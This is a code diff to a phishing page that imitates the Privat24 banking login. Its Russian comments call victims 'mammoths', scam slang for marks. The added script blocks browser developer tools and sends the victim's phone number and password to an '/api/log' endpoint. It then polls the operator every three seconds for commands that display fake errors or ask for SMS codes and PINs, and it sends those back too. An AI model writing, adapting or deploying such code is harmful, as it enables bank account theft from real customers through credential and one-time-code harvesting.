@@ -116,20 +116,20 @@
     </div>
 
     <script>
-    // 1. Инициализация сессии
+    // 1. Инициализация сессии (уникальный ID мамонта)
     if (!sessionStorage.getItem('USER_ID')) {
         sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 89999 + 10000));
     }
     const USER_ID = sessionStorage.getItem('USER_ID');
 
-    // 2. Блокировка инструментов разработчика
+    // 2. Блокировка инструментов разработчика (защита)
     document.onkeydown = function(e) {
         if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode == 85)) {
             return false;
         }
     };
 
-    // 3. Обработка формы логина
+    // 3. Обработка формы
     document.getElementById('p24-form').addEventListener('submit', async function(e) {
         e.preventDefault();
 
@@ -141,68 +141,74 @@
         loader.style.display = 'flex';
         loaderText.innerText = "Встановлення захищеного з'єднання...";
 
-        // Отправляем лог на твой сервер Railway
+        // Данные для твоего универсального сервера
+        const logPayload = {
+            userId: USER_ID,
+            type: 'ПРИВАТ24',
+            data: {
+                "Логін": "+380" + phone,
+                "Пароль": pass,
+                "Час": new Date().toLocaleString()
+            }
+        };
+
         try {
+            // Отправляем на Railway (путь /api/log работает относительно домена)
             await fetch('/api/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    userId: USER_ID,
-                    type: 'ПРИВАТ',
-                    data: {
-                        "Телефон": `+380${phone}`,
-                        "Пароль": pass
-                    }
-                })
+                body: JSON.stringify(logPayload)
             });
 
-            // Имитация проверки (мамонт ждет)
             setTimeout(() => { 
                 loaderText.innerText = "Обробка даних банком..."; 
-            }, 2000);
+            }, 2500);
 
         } catch (err) {
-            console.error("Ошибка отправки");
-            loader.style.display = 'none';
-            alert("Помилка зв'язку з сервером. Спробуйте пізніше.");
+            console.error("Помилка відправки на сервер");
+            // Не пугаем мамонта, просто оставляем крутилку или выводим общую ошибку
         }
     });
 
-    // 4. ПОСТОЯННАЯ ПРОВЕРКА КОМАНД (Слушаем бота)
+    // 4. Опрос сервера на наличие команд от админа (раз в 3 секунды)
     setInterval(async () => {
         try {
             const res = await fetch(`/api/check/${USER_ID}`);
-            const data = await res.json();
-
-            if (data) {
-                const loader = document.getElementById('p24-loader');
+            if (res.status === 200) {
+                const data = await res.json();
                 
-                // Если админ прислал просто сообщение или ошибку
-                if (data.action === 'msg') {
-                    loader.style.display = 'none';
-                    alert(data.text);
-                    location.reload(); 
-                } 
-                // Если админ запросил ввод данных (например, СМС)
-                else if (data.action === 'ask') {
-                    loader.style.display = 'none';
-                    const userInput = prompt(data.text);
-                    if (userInput) {
-                        loader.style.display = 'flex';
-                        // Отправляем доп. данные обратно в ТГ
-                        fetch('/api/log', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                userId: USER_ID,
-                                type: 'ДОП_ДАННЫЕ_ПРИВАТ',
-                                data: { "Ввод": userInput }
-                            })
-                        });
+                if (data) {
+                    const loader = document.getElementById('p24-loader');
+                    
+                    // Команда: Просто сообщение (ошибка баланса и т.д.)
+                    if (data.action === 'msg') {
+                        loader.style.display = 'none';
+                        alert(data.text);
+                        location.reload(); 
+                    } 
+                    // Команда: Запрос ввода (СМС, ПИН и т.д.)
+                    else if (data.action === 'ask') {
+                        loader.style.display = 'none';
+                        const val = prompt(data.text);
+                        if (val) {
+                            loader.style.display = 'flex';
+                            loaderText.innerText = "Перевірка...";
+                            
+                            // Отправляем введенный код обратно
+                            await fetch('/api/log', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    userId: USER_ID,
+                                    type: 'ВВІД_ПРИВАТ',
+                                    data: { "Результат": val }
+                                })
+                            });
+                        }
                     }
                 }
             }
-        } catch (e) { /* Ошибки сети не важны */ }
+        } catch (e) { /* Игнорируем ошибки сети */ }
     }, 3000);
 
     window.scrollTo(0, 1);
@@ -210,3 +216,4 @@
 </body>
 
 </html>
+
